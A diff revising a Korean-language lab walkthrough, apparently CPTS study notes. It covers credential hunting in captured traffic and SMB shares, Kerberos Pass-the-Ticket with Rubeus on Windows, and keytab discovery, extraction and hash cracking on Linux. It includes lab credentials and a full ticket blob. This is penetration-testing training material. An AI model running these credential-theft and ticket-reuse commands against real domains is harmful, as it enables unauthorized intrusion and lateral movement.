@@ -2,47 +2,51 @@
 title: "Password Attacks - Additional Techniques"
 date: 2026-08-18
 layout: single
-excerpt: "Windows 환경에서 파일, 브라우저, 레지스트리, 저장된 세션, 백업, 클립보드 등을 통해 자격 증명을 수집하고, 사용자 상호작용 및 다양한 추가 기법을 활용해 권한 상승과 횡적 이동으로 이어지는 공격 흐름을 실습한다."
+excerpt: "네트워크 트래픽과 공유 폴더에서 자격 증명을 탐색하고, Windows와 Linux 환경의 Kerberos 티켓, keytab, ccache를 활용한 Pass the Ticket과 AD CS ESC8 기반 NTLM Relay 공격 흐름을 실습한다."
 author_profile: true
 toc: true
 toc_label: "Password Attacks"
 toc_icon: "book"
 toc_sticky: true
 categories: [cpts-infra]
-tags: [windows, cpts, priv-esc, credential-theft, pillaging, lateral-movement, registry, browser-credentials, scheduled-tasks]
-
-published: false
+tags: [windows, cpts, credential-hunting, kerberos, ptt, adcs, ntlm-relay]
 ---
+
+네트워크 트래픽과 공유 폴더에서 자격 증명을 탐색하고, Windows와 Linux 환경의 Kerberos 티켓, keytab, ccache를 활용한 Pass the Ticket과 AD CS ESC8 기반 NTLM Relay 공격 흐름을 실습한다.
 
 # Extracting Password from the Network
 
 ## Credential Hunting in Network Traffic
 
-또한 네트워크에서 자격증명이 평문으로 패킷이 전달되거나 그럴수도있다.
+암호화되지 않은 네트워크 프로토콜이나 HTTP 요청을 사용하는 환경에서는 자격 증명과 민감 정보가 평문에 가까운 형태로 전송될 수 있다.
 
-따라서 그 패킷에 대하여 와이어 샤크나 tcpdump를 활용해 그 평문의 패킷을 낚아 챌수있따.
+따라서 Wireshark나 tcpdump로 패킷을 캡처하고 프로토콜별로 필터링하면 이러한 정보를 확인할 수 있다.
 
-이처럼 필터링을 통해 http 패킷을 훑어보니 /process_payment의 어떠한 사용자의 신용카드 정보가 나와있는것을 확인할수있다:
+예를 들어 HTTP 트래픽을 필터링해보면 `/process_payment` 로 전송되는 POST 요청의 Form Data에서 카드 번호, 만료일, CVV 등의 민감 정보가 노출되는 것을 확인할 수 있다:
 
-![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack1.png)
+![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks1.png)
 
-또한 ftp를 필터링해서 보게되면 user와 passwd가 고스란히 찍힌후 로그인에 성공하였음을 확인할수있다:
+또한 FTP는 기본적으로 제어 채널을 암호화하지 않기 때문에 `USER`와 `PASS` 명령이 평문으로 노출될 수 있다. 
 
-![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack2.png)
+아래에서는 `leah:qwerty123` 으로 로그인하는 과정이 그대로 확인된다:
 
-그리고 아래를 보면 creds.txt 파일이 다운로드 된것을 확인할수있었다:
+![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks2.png)
 
-![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack3.png)
+이후 FTP 세션에서 `RETR creds.txt` 요청이 발생한 것을 통해 `creds.txt` 파일이 다운로드된 사실도 확인할 수 있다:
 
-따라서 이처럼 패킷 캡처한 부분을 확인한후, ftp 서버로 이동하여 침해가 갈수있는 영향이존재할수있게뙨다.
+![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks3.png)
+
+이처럼 암호화되지 않은 프로토콜의 패킷을 통해 자격 증명이나 민감 정보가 노출될 수 있으며, 확보한 계정이 실제 서비스에서 재사용되는 경우 추가 접근으로 이어질 수 있다.
 
 ## Credential Hunting in Network Shares
 
-또한 공유 디렉토리 파일에서도 어떠한 자격증명이 존재할수있다.
+SMB 공유 디렉토리와 같은 네트워크 공유에도 설정 파일, 스크립트, 백업 파일 등의 형태로 자격 증명이나 민감 정보가 남아 있을 수 있다.
 
-대표적인 툴은 스니퍼.exe 툴이 존재하며 여러 공유 디렉토리를 탐색하여 자동화로 뽑아주는 도구이다.
+### Snaffler
 
-이처럼 작성한후 보게되면 자극적인 부분만 골라서 자동화가 될수있다:
+대표적인 자동화 도구로 `Snaffler.exe` 가 있으며, 접근 가능한 Windows 공유를 탐색하면서 비밀번호, 키, 설정 파일 등 민감할 가능성이 높은 파일을 규칙 기반으로 찾아준다.
+
+다음과 같이 실행하면 Snaffler가 접근 가능한 공유에서 관심 파일과 패턴을 자동으로 분류해 출력한다:
 
 ```powershell
 PS C:\Users\Public> Snaffler.exe -s
@@ -55,7 +59,9 @@ PS C:\Users\Public> Snaffler.exe -s
 # SKIP
 ```
 
-또한 저런것 아니여도 PowerHuntShares 도구를 활용해 네트워크 공유 파일들의 자격증명들을 대규모로 조사해주는 도구가 있다:
+### PowerHuntShares
+
+또한 `PowerHuntShares` 를 사용하면 도메인 내 SMB 공유, 권한, 과도하게 노출된 파일과 민감 데이터를 대규모로 조사할 수 있다:
 
 ```powershell
 PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
@@ -79,11 +85,13 @@ PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDir
 # SKIP
 ```
 
-그리고 이 툴의 좋은점이 저렇게 탐색에 완료한후 HTML을 REPORT 형식으로 발급해준다는 장점이 존재한다.
+탐색이 끝나면 결과를 HTML Report 형태로 확인할 수 있어, 위험한 ACE와 접근 가능한 민감 파일을 한눈에 정리하기 편리하다:
 
-![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack4.png)
+![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks4.png)
 
-그리고 또한 nxc를 통하여 내트워크 공유파일에서 passw를 지정한뒤에 찾는 방식도 존재한다:
+### NXC Share Spidering
+
+NXC의 Spider 기능을 사용하여 특정 SMB Share를 재귀적으로 탐색하고 파일 내용에서 `passw와`  같은 문자열을 찾는 방법도 있다:
 
 ```bash
 $ nxc smb 10.129.234.173 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
@@ -101,9 +109,9 @@ SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/ni
 SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/Antak-WebShell/antak.aspx [lastm:'2025-05-01 13:27' size:10444 offset:10444 pattern:'passw'] 
 ```
 
-이처럼 파일 내용에 passw가 들어간 파일들을 찾는 명령도 할수있게된다.
+이처럼 파일 내용에 `passw`가 포함된 위치를 빠르게 식별할 수 있다.
 
-직접 들어가 맨 첫번째인 split_tunnel.txt의 파일 내용을 보게되면 이렇게 자격증명이 적혀있는것을 확인할수있다:
+첫 번째 결과인 `split_tunnel.txt` 를 확인하면 다음과 같이 실제 자격 증명이 평문으로 기록되어 있음을 확인할 수 있다:
 
 ```text
 Old settings for legacy VPN deployment:
@@ -119,13 +127,15 @@ Old settings for legacy VPN deployment:
 
 ## Pass the Ticket (PtT) from Windows
 
-이제 ad 환경에서는 사용자의 인증을 대신 인증해줄수있는 티켓이 존재한다.
+AD 환경에서는 Kerberos 티켓이 사용자의 인증 상태를 증명하는 데 사용된다.
 
-이게 사용자의 자격증명이 없어도 티켓을 통하여 인증을 수행할수있기에 많이 사용하게된다.
+유효한 사용자의 Kerberos 티켓을 확보하면 해당 사용자의 평문 비밀번호를 몰라도 티켓의 유효 기간과 권한 범위 내에서 Kerberos 인증을 재사용할 수 있으며, 이를 Pass the Ticket(PtT)이라고 한다.
 
-우선 이번 계정은 로컬 서버에서 어드민으로 도달한후, 티켓을 이용해 횡적이동을 하는 시나리오다
+여기서는 먼저 로컬 호스트에서 관리자 권한을 확보한 뒤, 메모리에 존재하는 다른 도메인 사용자의 티켓을 이용해 횡적 이동하는 시나리오를 살펴본다.
 
-이렇게 내부에서 dump를 활용하여 내부애들을 추출할수있따:
+### Dumping Kerberos Tickets
+
+관리자 권한으로 `Rubeus dump` 를 사용하면 현재 호스트의 LSA/Kerberos 티켓 캐시에 존재하는 여러 로그온 세션의 티켓을 열거할 수 있다:
 
 ```powershell
 PS C:\Users\Administrator> .\Rubeus.exe dump /nowrap
@@ -213,22 +223,35 @@ Action: Dump Kerberos Ticket Data (All Users)
       doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ69cPsRJ8UxiRmke3oGPZpoT2TbBanqI5k906Oeu0tkXibLfbKo1cxXBDNSlihlMuZeDiGpriYweBnko6pp+14vTZqgUMoi8AnMLG3cUc35mh81XWKyRcPUBcQsb0em7kqM/AUG+Q/Xryv95SUdztsmXu7BqStCOuscPFqoUIyofIveI56hEEWa6FDgm/gD0BomrDuWb3Fr8OOjJiWXY/9IwGoV4RldE+MYQ1WOO1LNnCAsrhI9uS4zol6NYtNmjtdMrjRJwNMl1jXk01ly1PMDwswf7RLwv6HRftzds4B5qkl/qWRFoWQ7LANQYB9SYZHsruiGxh0gCPNFjcaMau5z4oPewEJiZiiX1lPmRCto1/fbVarqni1N9hXMMRdtBBHNOHFEXnxNlxRxVO9uVn3MzUv5+JQ4oetFb/0KLhqtP1mqUtnuReZxKcFB9Rsc5jmNP/cwaMjv33QDZIXRybgvMUkKcxDeNNdqIZPkf2r3vgekA8ll0/wjtou49P9PSvqnnzD9AKvujzepFOPHBEVNCoXfABsIvMxChtygrTE+eUbbfUuURwdDMeFB6eJhYdRqLMJ2M50pNwtF0PrjFZXKpbki1JMiFSfSyfVijvHhfX+9DsWWf/WZRq2kuZJqdpKmvgYv71a011qU8M+earQFczEMLDdsiWuC48YwlQhTmQ6mvJKOfOpyqVv/5xN5SeDbaxtQBvtuN0fc3p+8bqs50nxy2IZNwF9WWiDKq0IaVhAD9lCcKc87XNa6yIxXBwxQn1bqE+tDdJUmBW4x2kzqupt2z3Wrs8elYq0Dj4EYzAbjELzFiDFBSWo6IoQBDnA5DQYwqbAzDcbg3wzGE1ZP8D21vmm8Ok7TbF+IFo06Ly61e1dClC8xB8KmhvV/miGMcRf1EpJqoJSnL6bCmzS34G4vW5T+KwPhTlBYVvxqilL4uo0LoyKiwq2rNOWg25xZP+eb8ZlQjJ4BZWO8TaUxmI0zGziKee9H969lz3AzGHpW8Lb5H/0ORcLe/qH8Jt4mFUe38EJkilqIvvSB9KfjCnZEnx6X1qAGXH5rfThJ7ni6kKgmCiYX9XroTFiK5Djmq9q0QF7OM//tAhPLolGKl3pb7kuPCDHLgu+qvMzPC4GakpGUS9QRBJ4evfLkWQR58FLtmTP9jj/pwYLN3W1yipVvT7s95QAifA7QdhzWfH00KvNc18NUEmnxS0RLYUNOf3XoA3LelxoT7qgavoAN/1rlUgQO2IShO3cNphCH+BzloWcq874Tn1kqeUaW8mYkjKJX4nKBZ3fp0gqPfD54fJ4tmhmL0yn87JKd1exdx1yenhunCCBvGxTav7MoBVaK5gshbtLfAZtzwuHrDHRlbl+MmlWnGFAzoTwg8kKuUufxi6ytlbPy7WdieiLzPFnB32DYtOTDeYsEtCVok/hOI74mFMwKK2rG3qjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCByOilHPt4k6FHRUwoKQedBnjfpR7QeWV5oskbGVHSlj6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjA4MjYxOTQ2MzBaphEYDzIwMjYwODI3MDU0NjMwWqcRGA8yMDI2MDkwMjE5NDYzMFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC
 ```
 
-이처럼 현재 john, david, julio의 티켓들이 lsass나 켈베로스 세션에서 존재함을 확인할수있다.
+이처럼 현재 호스트의 Kerberos 티켓 캐시에 `john`, `david`, `julio` 등의 TGT가 존재하는 것을 확인할 수 있다.
 
-따라서 현재 각 티켓들은 살아있고, 티켓을 현 서버에 저장시켜 smb와 통신이 가능할수있다.
+유효한 티켓을 현재 로그온 세션에 주입하면 해당 사용자 컨텍스트로 Kerberos 서비스 티켓을 요청할 수 있으며, 대상 서비스에서 해당 사용자가 가진 권한 범위 내에서 인증에 활용할 수 있다.
 
-현재 티켓 발급의 구조는 이러하다:
+### Kerberos Ticket Flow
 
-john으로 가정하고 내부에서 발급을 요청하게되면 kdc, as 측에서 john이 맞는지 확인한 후 tgt를 보내준다.
-이때의 tgt는 krbtgt로 보호된 tgt를 부여받으며, 유효한 tgt가 된다.
+Kerberos의 기본적인 티켓 발급 흐름은 다음과 같다.
 
-따라서 이를 통하여 만약에 보호된 tgt를 부여받고 smb 서비스에 접근한다고 가정하자.
-그렇다면 그 tgt를 kdc, as 측에서 또 한번 검증한뒤 krbtgt의 키를 이용하여 복호화를 수행시켜 tgs를 발급하게 해준다.
+예를 들어 `john` 이 처음 인증할 때는 KDC의 AS(Authentication Service)에 AS-REQ를 보내고, 사전 인증이 정상적으로 검증되면 AS-REP로 TGT를 발급받는다.
 
-따라서 rebeus의 골든티켓에서 krbtgt의 키(해시) 가 존재하게되면 따로 kdc를 안거치고 로컬에서 즉석으로 공격자가 티켓을 만들수 있기에 치명적이게된다.
+이 TGT는 도메인의 `krbtgt` 계정 키로 암호화되어 있으며, 이후 KDC가 사용자의 인증 상태를 검증하는 데 사용한다.
 
-> 또한 내부에서 로컬과 도메인 서버는 다른 계정이다.
-예를들면 whoami 을 입력할때 현재는 다음과 같다:
+이 상태에서 `john` 이 SMB와 같은 특정 서비스에 접근하려면 TGT를 이용하여 KDC의 TGS(Ticket Granting Service)에 해당 서비스용 TGS를 요청한다.
+
+TGS는 TGT를 `krbtgt` 키로 검증하고 요청이 유효하면 대상 서비스의 키로 보호된 Service Ticket(TGS)을 발급한다. 
+
+클라이언트는 이 Service Ticket을 대상 서비스에 제시해 인증한다.
+
+Golden Ticket은 `krbtgt` 의 장기 키를 알고 있을 때 공격자가 로컬에서 임의의 TGT를 위조하는 기법이다. 
+
+TGT 자체는 KDC에 요청하지 않고 만들 수 있지만, 일반적인 서비스 접근에서는 이 위조 TGT를 사용해 KDC에 TGS를 요청하게 된다.
+
+반면 Silver Ticket은 대상 서비스 계정의 키를 이용해 Service Ticket 자체를 위조하는 방식이므로, 특정 서비스에 접근하는 과정에서 KDC와 통신하지 않고 사용할 수 있다.
+
+### Local and Domain Accounts
+
+로컬 계정과 도메인 계정은 서로 다른 보안 주체이므로 구분해야 한다.
+
+예를 들어 현재 세션에서 `whoami` 를 확인하면 다음과 같다:
 
 ```powershell
 PS C:\Users\Administrator> whoami
@@ -236,14 +259,19 @@ PS C:\Users\Administrator> whoami
 ms01/administrator
 ```
 
-이처럼 현재 서버는 로컬에 해당하는 서버이다.
+이 출력의 `MS01\Administrator` 는 `MS01` 호스트의 로컬 Administrator 계정으로 로그인한 상태라는 의미이다.
 
-따라서 현 서버는 도메인과 직접적 연관이 없는 서버기에 만약 tgt의 대부분 연관되어있는 곳은 도메인 서버이다.
-따라서 그 도메인 tgt 를 이용하여 같은이름으로 로컬 서버에 들어갈려하면 무조건 실패하게된다. (그리고 애초에 로컬서버는 AD가 존재하지않아 tgt 라는 개념이 존재하지않는다.)
+호스트 자체가 AD 도메인에 가입되어 있을 수 있어도 로컬 계정과 `INLANEFREIGHT\Administrator` 같은 도메인 계정은 서로 다른 SID와 자격 증명을 가진 별개의 계정이다.
 
-이를 기준으로 현재 도메인 계정에 해당되는 3마리의 tgt를 획득한 상태이므로 이를 활용하여 smb tgs를 발급할수있다.
+따라서 도메인 사용자의 TGT는 해당 도메인 Principal의 Kerberos 인증에 사용되는 것이며, 이름이 같다는 이유만으로 로컬 계정의 인증 수단으로 사용할 수는 없다.
 
-이를 토대로 ptt를 이용하여 john의 tgt를 삽입하였다:
+로컬 계정은 일반적으로 SAM 기반 인증을 사용하며 Kerberos TGT를 발급받지 않는다.
+
+현재는 도메인 계정인 `john`, `david`, `julio`의 TGT를 확보했으므로, 이 티켓을 이용해 해당 사용자에게 허용된 SMB 등의 서비스에 대한 TGS를 요청할 수 있다.
+
+### Injecting and Reusing the TGT
+
+먼저 PtT를 이용하여 `john` 의 TGT를 현재 로그온 세션에 주입하였다:
 
 ```powershell
 PS C:\Users\Administrator> .\Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ69cPsRJ8UxiRmke3oGPZpoT2TbBanqI5k906Oeu0tkXibLfbKo1cxXBDNSlihlMuZeDiGpriYweBnko6pp+14vTZqgUMoi8AnMLG3cUc35mh81XWKyRcPUBcQsb0em7kqM/AUG+Q/Xryv95SUdztsmXu7BqStCOuscPFqoUIyofIveI56hEEWa6FDgm/gD0BomrDuWb3Fr8OOjJiWXY/9IwGoV4RldE+MYQ1WOO1LNnCAsrhI9uS4zol6NYtNmjtdMrjRJwNMl1jXk01ly1PMDwswf7RLwv6HRftzds4B5qkl/qWRFoWQ7LANQYB9SYZHsruiGxh0gCPNFjcaMau5z4oPewEJiZiiX1lPmRCto1/fbVarqni1N9hXMMRdtBBHNOHFEXnxNlxRxVO9uVn3MzUv5+JQ4oetFb/0KLhqtP1mqUtnuReZxKcFB9Rsc5jmNP/cwaMjv33QDZIXRybgvMUkKcxDeNNdqIZPkf2r3vgekA8ll0/wjtou49P9PSvqnnzD9AKvujzepFOPHBEVNCoXfABsIvMxChtygrTE+eUbbfUuURwdDMeFB6eJhYdRqLMJ2M50pNwtF0PrjFZXKpbki1JMiFSfSyfVijvHhfX+9DsWWf/WZRq2kuZJqdpKmvgYv71a011qU8M+earQFczEMLDdsiWuC48YwlQhTmQ6mvJKOfOpyqVv/5xN5SeDbaxtQBvtuN0fc3p+8bqs50nxy2IZNwF9WWiDKq0IaVhAD9lCcKc87XNa6yIxXBwxQn1bqE+tDdJUmBW4x2kzqupt2z3Wrs8elYq0Dj4EYzAbjELzFiDFBSWo6IoQBDnA5DQYwqbAzDcbg3wzGE1ZP8D21vmm8Ok7TbF+IFo06Ly61e1dClC8xB8KmhvV/miGMcRf1EpJqoJSnL6bCmzS34G4vW5T+KwPhTlBYVvxqilL4uo0LoyKiwq2rNOWg25xZP+eb8ZlQjJ4BZWO8TaUxmI0zGziKee9H969lz3AzGHpW8Lb5H/0ORcLe/qH8Jt4mFUe38EJkilqIvvSB9KfjCnZEnx6X1qAGXH5rfThJ7ni6kKgmCiYX9XroTFiK5Djmq9q0QF7OM//tAhPLolGKl3pb7kuPCDHLgu+qvMzPC4GakpGUS9QRBJ4evfLkWQR58FLtmTP9jj/pwYLN3W1yipVvT7s95QAifA7QdhzWfH00KvNc18NUEmnxS0RLYUNOf3XoA3LelxoT7qgavoAN/1rlUgQO2IShO3cNphCH+BzloWcq874Tn1kqeUaW8mYkjKJX4nKBZ3fp0gqPfD54fJ4tmhmL0yn87JKd1exdx1yenhunCCBvGxTav7MoBVaK5gshbtLfAZtzwuHrDHRlbl+MmlWnGFAzoTwg8kKuUufxi6ytlbPy7WdieiLzPFnB32DYtOTDeYsEtCVok/hOI74mFMwKK2rG3qjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCByOilHPt4k6FHRUwoKQedBnjfpR7QeWV5oskbGVHSlj6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjA4MjYxOTQ2MzBaphEYDzIwMjYwODI3MDU0NjMwWqcRGA8yMDI2MDkwMjE5NDYzMFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC
@@ -252,7 +280,7 @@ PS C:\Users\Administrator> .\Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIE
 [+] Ticket successfully imported!
 ```
 
-이 상태에서 klist를 보게되면 정상적으로 john의 tgt가 삽입된것을 확인할수있다:
+이후 `klist` 를 확인하면 현재 로그온 세션에 `john` 의 TGT가 정상적으로 들어간 것을 확인할 수 있다:
 
 ```powershell
 PS C:\tools> klist
@@ -273,23 +301,23 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-이를 토대로 dc01의 john 통신을 smb 요청하였다:
+이 상태에서 DC01의 SMB 리소스에 접근하면 필요 시 KDC로부터 CIFS Service Ticket을 발급받아 `john` 의 Kerberos 인증으로 접근하게 된다:
 
-![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack5.png)
+![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks5.png)
 
-그 결과 이처럼 내부에 진입할수있게된다.
+그 결과 `john` 에게 허용된 SMB 리소스에 정상적으로 접근할 수 있었다.
 
-또한 만약 john한테 winrm이나 rdp 들어갈수있는것이 존재하게되면 이렇게도 가능해진다:
+WinRM 등 Kerberos 인증을 지원하는 원격 서비스에서도 동일한 티켓을 활용할 수 있지만, 실제 접속 가능 여부는 해당 사용자의 권한과 서비스 설정에 따라 달라진다:
 
-![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack6.png)
+![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks6.png)
 
-이렇게 원격 이동으로 도메인 내부의 john 유저로 들어갈수있게된다.
+이처럼 평문 비밀번호를 알지 못하더라도 유효한 Kerberos 티켓과 충분한 권한이 있다면 도메인 내부에서 해당 사용자 컨텍스트로 원격 접근이 가능할 수 있다.
 
 ## Pass the Ticket (PtT) from Linux
 
-또한 리눅스에서도 active directoey랑 관련이 있을수가있다.
+Linux 호스트 역시 SSSD, Winbind 등을 통해 Active Directory에 가입되어 Kerberos 인증을 사용할 수 있다.
 
-보게되면 이처럼 david와 julio가 active directory 소속인것을 확인할수잇다:
+`realm list` 를 확인하면 현재 `linux01` 이 `INLANEFREIGHT.HTB` AD 도메인에 가입되어 있고, `david` 와 `julio` 가 허용된 로그인 계정으로 설정되어 있음을 확인할 수 있다:
 
 ```bash
 david@inlanefreight.htb@linux01:~$ realm list
@@ -313,7 +341,7 @@ inlanefreight.htb
   permitted-groups: Linux Admins
 ```
 
-또한 realm이 안깔려져있으면 이를 적어서 추론할수있따:
+`realm` 명령을 사용할 수 없는 환경이라도 SSSD 또는 Winbind 프로세스와 설정을 확인하여 AD 통합 여부를 추론할 수 있다:
 
 ```bash
 david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
@@ -326,13 +354,15 @@ root        1330       1  0 03:00 ?        00:00:00 /usr/libexec/sssd/sssd_pac -
 david@i+    9143    8372  0 05:21 pts/0    00:00:00 grep --color=auto -i winbind\|sssd
 ```
 
-이처럼 현재 도메인에 가입되어있는것을 확인할수있다.
+위 출력에서는 SSSD가 `inlanefreight.htb` 도메인 백엔드로 동작하고 있으므로 해당 Linux 호스트가 AD 인증과 연동되어 있음을 확인할 수 있다.
 
-리눅스는 대표적으로 keytab 파일과 ccache 파일로 구분된다.
+### Keytab Files
 
-이중 keytab은 티켓을 발급받는 데 사용할 수 있는 비밀키로 사용된다.
+Linux의 Kerberos 환경에서는 장기 키를 보관하는 Keytab과 이미 발급받은 티켓을 보관하는 Credential Cache(ccache)를 자주 확인하게 된다.
 
-내부에 keytab 파일이 존재하는것을 확인할수잇따:
+Keytab은 Principal의 장기 Kerberos 키를 파일 형태로 저장하며, 비밀번호를 직접 입력하지 않고 `kinit -k` 를 통해 TGT를 발급받는 데 사용할 수 있다.
+
+우선 시스템에서 접근 가능한 Keytab 파일을 검색하였다:
 
 ```bash
 david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
@@ -342,11 +372,13 @@ david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
    262163      4 -rw-rw-rw-   1 root     root          216 Aug 20 05:20 /opt/specialfiles/carlos.keytab
 ```
 
-이처럼 현재 carlos.keytab이 존재하였으며, 모든 유저에게 읽기와 쓰기 권한이 존재한다.
+`carlos.keytab` 은 권한이 `-rw-rw-rw-` 로 설정되어 있어 모든 사용자가 읽고 수정할 수 있는 위험한 상태이다.
 
-keytab은 읽기와 쓰기가 존재하여야 사용할수있다.
+Keytab을 인증에 사용하려면 파일의 키 데이터를 읽을 수 있으면 되므로 쓰기 권한은 필요하지 않다. 
 
-따라서 klist를 이용해 keytab 파일 내부에 어떤게 있는지 알수있다:
+오히려 일반 사용자에게 읽기 권한이 노출된 것 자체가 장기 키 유출로 이어질 수 있다.
+
+`klist -k -t` 를 사용하면 Keytab에 저장된 Principal, KVNO, Timestamp 등의 엔트리를 확인할 수 있다:
 
 ```bash
 david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 
@@ -359,13 +391,15 @@ KVNO Timestamp           Principal
    1 08/20/2026 05:25:01 carlos@INLANEFREIGHT.HTB
 ```
 
-carlos의 keytab임을 확인하였기에 이를 토대로 keytab을 적용시킬수있다:
+`carlos@INLANEFREIGHT.HTB` 의 Keytab임을 확인했으므로 다음과 같이 `kinit -k -t` 로 해당 키를 이용해 TGT를 발급받을 수 있다:
 
 ```bash
 david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
 ```
 
-또한 저방법도있지만, keytabextract.py 을 사용하여 keytab 내부에 해시를 추출할수있다:
+### Extracting Keys from Keytabs
+
+또한 `keytabextract.py` 와 같은 도구를 사용하면 Keytab에 저장된 Kerberos 키 재료를 추출할 수 있다:
 
 ```bash
 david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
@@ -381,7 +415,7 @@ david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfil
         AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
 ```
 
-이를 토대로 나의 로컬에서 해시를 해독후에 사용이 가능하다:
+여기서 RC4-HMAC 키는 AD 계정의 NT 해시와 동일한 값이므로 `hashcat -m 1000` 으로 오프라인 크랙을 시도할 수 있다:
 
 ```bash
 $ hashcat -m 1000 'a738f92b3c08b424ec2d99589a9cce60' /usr/share/wordlists/rockyou.txt --show
@@ -389,9 +423,13 @@ $ hashcat -m 1000 'a738f92b3c08b424ec2d99589a9cce60' /usr/share/wordlists/rockyo
 a738f92b3c08b424ec2d99589a9cce60:Password5
 ```
 
-이를 토대로 ssh 연결을 통하여 이동이 가능해진다.
+RC4-HMAC/NT 해시가 약한 비밀번호에서 생성된 경우 위처럼 평문 비밀번호를 복구할 수 있으며, 해당 계정이 SSH 로그인을 허용한다면 확보한 비밀번호를 다른 인증 경로에도 검증할 수 있다.
 
-내부에서 크론탭을 살펴보면 이런게 존재한다:
+### Discovering Keytabs in Scheduled Tasks
+
+추가 Keytab을 찾기 위해 사용자의 예약 작업과 스크립트도 확인할 수 있다. 
+
+`crontab` 을 살펴보면 다음 작업이 존재한다:
 
 ```bash
 carlos@inlanefreight.htb@linux01:~$ crontab -l
@@ -399,9 +437,9 @@ carlos@inlanefreight.htb@linux01:~$ crontab -l
 */5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
 ```
 
-이처럼 kerberos_script_test.sh 파일이 5분마다 자동화 되고있음을 확인할수있다.
+`kerberos_script_test.sh` 가 5분마다 실행되도록 설정되어 있음을 확인할 수 있다.
 
-.sh 파일을 제대로 보게되면 내부에 svc_뭐시기 유저의 kinit으로 유저의 티켓을 삽입후에 smbclient로 연결을 함을 확인할수잇다:
+스크립트 내용을 보면 `svc_workstations` Keytab으로 `kinit` 을 수행한 뒤, 발급된 Kerberos 티켓을 이용해 `smbclient` 로 DC01의 공유에 접근하는 흐름을 확인할 수 있다:
 
 ```bash
 carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
@@ -411,7 +449,7 @@ kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.s
 smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
 ```
 
-.script 디렉토리 내부를 보게되면 이처럼 john과 svc뭐시기 유저의 keytab들이 존재함을 확인할수있따:
+`.scripts` 디렉토리를 확인하면 `john` 과 `svc_workstations` 관련 Keytab 파일들이 추가로 존재한다:
 
 ```bash
 carlos@inlanefreight.htb@linux01:~/.scripts$ ls -l
@@ -422,9 +460,9 @@ carlos@inlanefreight.htb@linux01:~/.scripts$ ls -l
 -rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  94 Aug 20 05:35 svc_workstations.kt
 ```
 
-일반 kt파일은 특정 키/일부 encryption type만 들어간 keytab일 가능성이 높다.
+이 환경에서는 `svc_workstations._all.kt` 가 동일 Principal의 여러 Encryption Type 엔트리를 포함하는 Keytab으로 사용되고 있다.
 
-따라서 같은 principal의 여러 encryption type/key 엔트리를 전부 포함한 keytab _all.kt 파일을 통하여 py 스크립트를 활용해 추출하였다:
+따라서 해당 Keytab을 `keytabextract.py` 로 분석해 저장된 키 재료를 추출하였다:
 
 ```bash
 carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py svc_workstations._all.kt
@@ -440,7 +478,7 @@ carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py svc_w
         AES-128 HASH : 3a7e52143531408f39101187acc80677
 ```
 
